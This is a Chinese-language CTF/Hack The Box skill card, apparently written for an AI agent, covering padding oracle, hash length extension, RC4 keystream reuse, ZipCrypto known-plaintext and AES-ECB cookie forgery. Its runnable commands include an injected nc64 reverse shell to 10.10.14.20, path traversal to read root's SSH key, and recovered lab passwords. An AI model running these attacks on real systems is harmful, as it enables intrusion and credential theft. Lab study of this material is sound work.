---
name: 'crypto-classic-attack-patterns'
description: '看到加解密/校验接口、不透明 cookie 或加密 zip 时来查:密文改一字节后服务端把 "Padding is invalid"/"Invalid padding" 与 MAC 错分开报、cookie 是 base64(user:role:sha256(secret||data)) 这种 secret 前置 MAC、同一密钥加密多条消息、加密 zip 里有我已知内容的文件、相同明文块产出相同密文块。（检索词：padding oracle/padding-oracle/填充预言机/paddingoracle/python-paddingoracle/PaddingOracle/PadBuster/padbuster/pyOracle2/bit flipping/字节翻转/hash length extension/hash-length-extension/长度扩展/hash_extender/hashpump/secret prefix MAC/密钥流重用/密钥流复用/keystream reuse/keystream-reuse/流密码/stream cipher/RC4/known plaintext/known-plaintext/已知明文/KPA/ZipCrypto/zipcrypto/pkcrack/zipdecrypt/ECB/AES ECB/AES-ECB/ECB mode/分组对齐/chosen plaintext/选择明文/encryption oracle/加密预言机/crypto/classic/attack/patterns）'
whenToUse: '遇到加解密/校验端点、不透明 cookie/token、加密 zip,且能观察到报错差异或拿到明文密文对时加载;拿到 hash 转 password-attacks,拿到 machineKey 转 dotnet-viewstate-machinekey-rce'
metadata: { domain: crypto, tier: T2 }
---

# 经典密码学误用：预言机与流密码复用

> 来自 Insane 官方 WP 逐台回核,**6 台命中**:Ouija / Smasher / Perspective / Kryptos / Sekhmet / Fingerprint。
> 🔑 不问「密钥是什么」,问「哪条错误路径告诉我一位信息」—— 没有一台破解了算法,全是把**正常功能**当预言机。

## 触发信号

- 改一字节密文,服务端分开报 `Padding is invalid and cannot be removed` / `Invalid padding` / `Hash is ok` / `Generic error`
- cookie 形如 `base64(user:role:hash)`,源码里 `sha256.update(key)` 在 `update(identification)` **之前**(secret 前置 MAC)
- 密文 base64 -d 后长度**不是 16 的整数倍**(如 19)→ 流密码;或相同明文块产出**相同密文块**(ECB)
- **encrypt 可用、decrypt 不可用**,或写操作回吐 `Set-Cookie`;或站点有 AES / RC4 两选项且能提交 URL 去抓
- 有加密 zip,且包内某文件内容可预测(`/etc/passwd`、你上传的文件)

## 前置验证

```bash
echo -n <REDACTED> | base64 -d | wc -c            # 19 → 流密码
7z l -slt backup.zip | grep -iE 'method|encrypted'                 # ZipCrypto 还是 AES-256?
curl -v -b "user_id=<stolen>" -d "new_name=test" localhost:8088/profile | grep -i set-cookie
```

## 模式 1: CBC 填充预言机

条件:篡改 CBC token 后服务端**区分「padding 错」与「其他错」**。解密给「读」,**加密给「写」**。

```bash
git clone https://github.com/mwielgoszewski/python-paddingoracle && cd python-paddingoracle
# class PadBuster(PaddingOracle); padbuster.decrypt(encrypted_cookie, block_size=16, iv=bytearray(8))
python smasher-paddingoracle.py irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
git clone https://github.com/liquidsec/pyOracle2 && cd pyOracle2
# ini: URL=.../handlers/changePassword.ashx  vulnerableParameter=token  blocksize=16
#      encodingMode=base64Url  oracleMode=negative  oracleText=Padding is invalid
python3 pyOracle2.py -m decrypt -c perspective.ini -i sv5aK7gUk4Gaj-TKdpKjVqHbbwpzpGwyVptqStKu2nM
python3 pyOracle2.py -m encrypt -c perspective.ini -i "admin@perspective.htb & \\programdata\\nc64.exe 10.10.14.20 7777 -e cmd"
```

🔴 `oracleMode = negative` = **不含该串才算 padding 正确**,写反出垃圾明文。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Smasher | 内网 1337 "AES Checker";错误串 `Hash is ok`/`Invalid padding`/`Generic error`;`block_size=16, iv=bytearray(8)` 解出 SSH 口令 `PaddingOracleMaster123` |
| Perspective | 改 `token` 报 `Padding is invalid and cannot be removed`;`-m encrypt` 打 `PasswordReset.exe` 命令拼接 → 反弹 shell |

## 模式 2: 哈希长度扩展（secret 前置 MAC）

条件:`hash = SHA256(secret || identification)` 且有一条合法 `(identification, hash)` 对;Merkle–Damgård 允许续接,**但必须知道 secret 长度**。

```bash
echo -n "bot1:bot" | xxd -p | base64        # → NjI2Zjc0MzEzYTYyNmY3NAo= (utf-8 → hex → base64)
# 合法对 ihash=4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 → "Insufficient Privileges"
git clone https://github.com/iagox86/hash_extender.git && cd hash_extender && make
./hash_extender -data 'bot1:bot' --secret 23 --append '::admin:True' \
  --signature 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 --format sha256
# 循环 secret=1..N 抓 "New signature: ([0-9a-fA-F]{64})" / "New string: (.+)";命中 secret length: 23
#   ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
```

🔴 扩展后的 identification 含**二进制 padding 字节**,回传前必须 `base64.b64encode(bytes.fromhex(...))`。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Ouija | Node `/users` + `/file/get`;爆出 secret length **23**,append `::admin:True` → 越权后用 `/proc` 读 `/etc/passwd` 与 `leila` 的 SSH 私钥 |

## 模式 3: 流密码密钥流复用 / 已知明文（RC4）

条件:**同一 key 加密多条消息**。`C1 ^ C2 = M1 ^ M2`,知道任一条明文即可还原另一条。

```bash
# Perspective: 明文 PTOfEqOrGreaterLen! 走 SSRF 塞给 /encrypt 的 plaintext 参数 → enc1:3lBSpQNhzuxlbcuNhkH+sXJpkA==
python3 -c "
import base64
x=lambda a,b: bytes([p^q for p,q in zip(a,b)])
c1=base64.b64decode('3lBSpQNhzuxlbcuNhkH+sXJpkA==')
c2=base64.b64decode('<REDACTED>')
print(x(c2,x(c1,b'PTOfEqOrGreaterLen!')))"     # b'<REDACTED>'
# Kryptos: python3 -c "print('A' * 15000)" > message1;密文存 ciphertext1,再抓 /dev/index.php 存 ciphertext2
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Perspective | `web.config` 的 `ViewStateUserKey = ENC1:<REDACTED>` 是弱 RC4;XOR 出 `<REDACTED>`,配合 `machineKey` 做 ViewState 反序列化 RCE |
| Kryptos | `encrypt.php` 选 RC4,抓自己 HTTP 服务的 `message1`(15000 个 `A`)得 C1,再抓 `127.0.0.1/dev/index.php` 得 C2,还原内网源码 |

🔴 流密码复用不需密钥与算法实现 —— **只要两条密文 + 一条明文**。

## 模式 4: 已知明文攻破 ZipCrypto（pkcrack）

条件:zip 是 **ZipCrypto**(不是 AES-256),且包内**至少一个文件内容可预测**;`/etc/passwd` 是首选。

```bash
scp webster@10.10.11.179:/home/webster/backup.zip .
git clone https://github.com/keyunluo/pkcrack && mkdir pkcrack/build && cd pkcrack/build && cmake .. && make && cd ..
bin/extract ../backup.zip etc/passwd passwd.enc       # 抽出包内目标文件密文
scp webster@10.10.11.179:/etc/passwd .                # 取明文原件(必须逐字节一致)
zip plain.zip passwd && bin/extract plain.zip passwd passwd.plain   # 同名路径!
bin/pkcrack -c passwd.enc -p passwd.plain             # → d6829d8d 8514ff97 afc3f825(不爆口令)
bin/zipdecrypt d6829d8d 8514ff97 afc3f825 ../backup.zip ../decrypted.zip && unzip decrypted.zip
```

🔴 明文必须**逐字节一致**(换行/编码/结尾);不一致时 `pkcrack` 不报错,只是永不收敛。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Sekhmet | `/home/webster/backup.zip` 为 ZipCrypto,内含 SSSD 数据与 `/etc/passwd`;用真 `/etc/passwd` 当明文得 key `d6829d8d 8514ff97 afc3f825`,解包后从 `var/lib/sss/db/cache_windcorp.htb.ldb` 提 `Ray.Duncan@windcorp.htb` 的 hash |

## 模式 5: AES-ECB 分组对齐 + 加密预言机

条件:ECB + 服务端**把用户输入拼进明文**再加密,且能拿到任意输入的密文 → 逐字节恢复未知字段或**构造管理员明文**。

```bash
# Fingerprint: cookie = hex(AES_ECB("username,SECRET,true|false"));block_size = 16
#   cryptor = AES.new(KEY, AES.MODE_ECB); SECRET = "<REDACTED>"
#   /profile 的 new_name 就是加密预言机(登录后 POST 即回吐 Set-Cookie)
# 更省事: 解析是 g.uid.split("," + SECRET + ",") 且 SECRET 已知 → 直接注入分隔符
curl -v -b "user_id=<cookie>" -d 'new_name=user,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,true,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!' localhost:8088/profile
```

🔴 有加密预言机时**先读解析代码再决定爆不爆**:`split(...)` 只取 `split[1]`,多塞一个 `,true,` 就够。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Fingerprint | AES-ECB,`SECRET = "<REDACTED>"`,`block_size = 16`;先 XSS 偷 `user_id`,再用 `/profile` 的 `new_name` 当加密预言机;伪造 admin cookie 后 `curl --path-as-is ... "localhost:8088/admin/view/../../../../../root/.ssh/id_rsa"` 读 root 私钥 |

## 快速检查清单

```bash
[ ] 密文 base64 -d 后长度是 16 的倍数? 不是 → 流密码,先找同一 key 的第二条密文
[ ] 改 1 字节密文,报错串有几种? 能区分 padding/其他 → 填充预言机
[ ] hash 是 HMAC 还是 secret||data? update(key) 在前 → 长度扩展,secret 长度爆 1..32
[ ] 加密 zip 看 7z l -slt 的 method;相同明文块 = 相同密文块 → ECB,找加密预言机
```

## 教训

1. **错误串就是预言机** —— 三种响应的存在等价于「服务端在告诉你这一位对不对」;而 **encrypt 比 decrypt 值钱**(解密给「读」,加密给「写」)。
2. **secret 前置的 MAC 不是 MAC** —— `SHA256(key||data)` 是长度扩展的教科书场景;识别点只有 `update(key)` 在 `update(data)` 之前。
3. **已知明文常常就在目标上** —— Sekhmet 的 `/etc/passwd` 从靶机 scp 下来,Kryptos 的明文是自己生成的 15000 个 `A`;流密码复用不需密钥与算法实现。
4. 🔴 **别把「密文不可读」当结论** —— 6 台里没有一台的密钥是被破解的,全部是被**误用**的。

## 模式 6: 「固定参数」启发式 —— 挑战/CTF 密码题的第一问（2026-10，5/5 命中）

**读题面脚本时，第一个问题永远是："这些参数里，哪一个是被固定 / 被共享的？"**
"削弱版现代密码"题的标准破口就在这句话上：

| 被固定的量 | 后果 | 自校验判据 |
|---|---|---|
| **小 `e` 固定 + 每次换 `n` + 明文恒定** | **Håstad 低指数广播**：取 ≥e 组 `(nᵢ,Cᵢ)` → **CRT 合并 + 开 e 次整数根**（**完全不用分解任何 `n`**）| 合并后 `M > C`（未回绕）且 `m^e == C` 精确成立 |
| **`(key,nonce)` 加密多条** | 密钥流复用（见模式 3）：`KS = C_known ^ P_known` | 明文可打印 + `HTB{` 边界 |
| **随机量生成在循环外**（如 LWE 的噪声向量 `r` 只采样一次） | 它是**常量**：`v = (out − r)·pubkey⁻¹` 直接扣掉；`r` 空间小就**枚举 + 多行一致性校验**（实测 `r∈{0..10}³`=1331 种 + 47 行校验得唯一解）| 若 key 对而 IV 错，只有第 1 块乱、第 2 块起可读（**CBC 判据**）|
| **seed 明文写在密文头部** / `srand(time(0))` | 前者直接用；后者结合**文件 mtime / 题面时间 / 日志时间**枚举小时间窗 | 用原逻辑重放得到同一密文 |
| 仿射 `(a·c+b) mod 256` | 求逆元 | 逐字节比对 |
| 某字段"看起来像密钥" | ⚠️ **先验证它真的是密钥**：实测有一例 64-hex 字段其实只是**名字**，其 FieldRva 指向 3 字节 AMSI patch（`48 31 C0`）| 追到实际初始化指令再下结论 |

## 模式 7: 近似公因子（ACD）+ 格约减 LLL（2026-10 实战）

**触发信号**：`c = p·d + 噪声`，其中 `p` 是固定大素数（如 1024 bit）、噪声远小于 `p`（如 513 bit）；
每个 flag 位被编进一次噪声（如 `c = p·d + (2r + b)`）。

**原理**：对任意 `a ∈ L₀ = {a : Σaᵢxᵢ = 0}` 且 `‖a‖₁·2^(噪声位数) < p`，都有 `Σaᵢqᵢ = 0`
⇒ mod 2 得 GF(2) 方程 `Σ(aᵢ mod 2)(qᵢ mod 2) = 0`，而 `bᵢ = (xᵢ mod 2) XOR (qᵢ mod 2)`；
再加**结构方程**（如"每字符 MSB=0"）解 GF(2) 即得明文。

**三个必踩坑（实测）**

1. 🔴 **L₀ 必须用饱和基**（单模消元 / 行向量 Smith 型）。直接用生成元格 `xₙeᵢ − xᵢeₙ` 做 LLL 会因 index `= xₙ^(n−2)` 只给出 `~‖x‖` 长的**废关系**。
2. 🔴 **必须按 `‖a‖₁ < 2^(p 位数 − 噪声位数)` 过滤关系**：**超限关系给出错误的 mod-2 方程**，症状是"**rank 满、零矛盾、却解出不可打印的假解**"（全量 n 也照样中招）。
3. 🔴 **分块时 chunk 长度必须是 8 的倍数**，否则块内字节边界 ≠ 字符边界，"NSB/MSB=0"这类结构方程不成立（`free=0` 却不可打印）。

**自校验**：分块结果每一块都是**唯一可打印候选**；用**两种不同分区**各跑一遍，结果必须一致（实测 4×96 与 4×88 完全一致才提交）。

## 相关卡

- `weak-rsa-key-recovery` / `challenge-crypto-prng` —— 密钥本身弱,或 PRNG 可预测/秘密复用
- `dotnet-viewstate-machinekey-rce` —— 出现 `__VIEWSTATE` / `ENC1:` / `machineKey` 泄露时转过去
- `flask-session-forgery` / `hash-shucking` / `password-attacks` / `web-attacks` —— 伪造 cookie、破 hash,或先拿 SSRF/报错/XSS 建立预言机
